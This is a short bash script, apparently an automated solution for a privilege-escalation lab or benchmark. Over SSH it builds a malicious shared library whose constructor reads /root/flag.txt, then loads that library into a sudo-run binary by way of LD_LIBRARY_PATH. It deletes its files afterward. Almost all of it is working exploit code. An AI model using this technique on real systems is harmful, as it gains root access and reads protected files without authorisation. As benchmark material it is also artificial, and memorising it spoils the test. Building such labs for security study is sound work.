#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
cat >/tmp/ldlibpwn.c <<'\''EOF'\''
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) static void pwn(void) {
  if (geteuid() != 0) return;
  FILE *f = fopen("/root/flag.txt", "r");
  if (!f) return;
  char buf[256];
  if (fgets(buf, sizeof buf, f)) fputs(buf, stdout);
  fclose(f);
}
EOF
gcc -shared -fPIC -o /home/lowpriv/ldlib/libpayload.so /tmp/ldlibpwn.c
sudo -n LD_LIBRARY_PATH=/home/lowpriv/ldlib /opt/bench/ldvictim
rm -f /tmp/ldlibpwn.c /home/lowpriv/ldlib/libpayload.so
')"
assert_root_output "${out}"
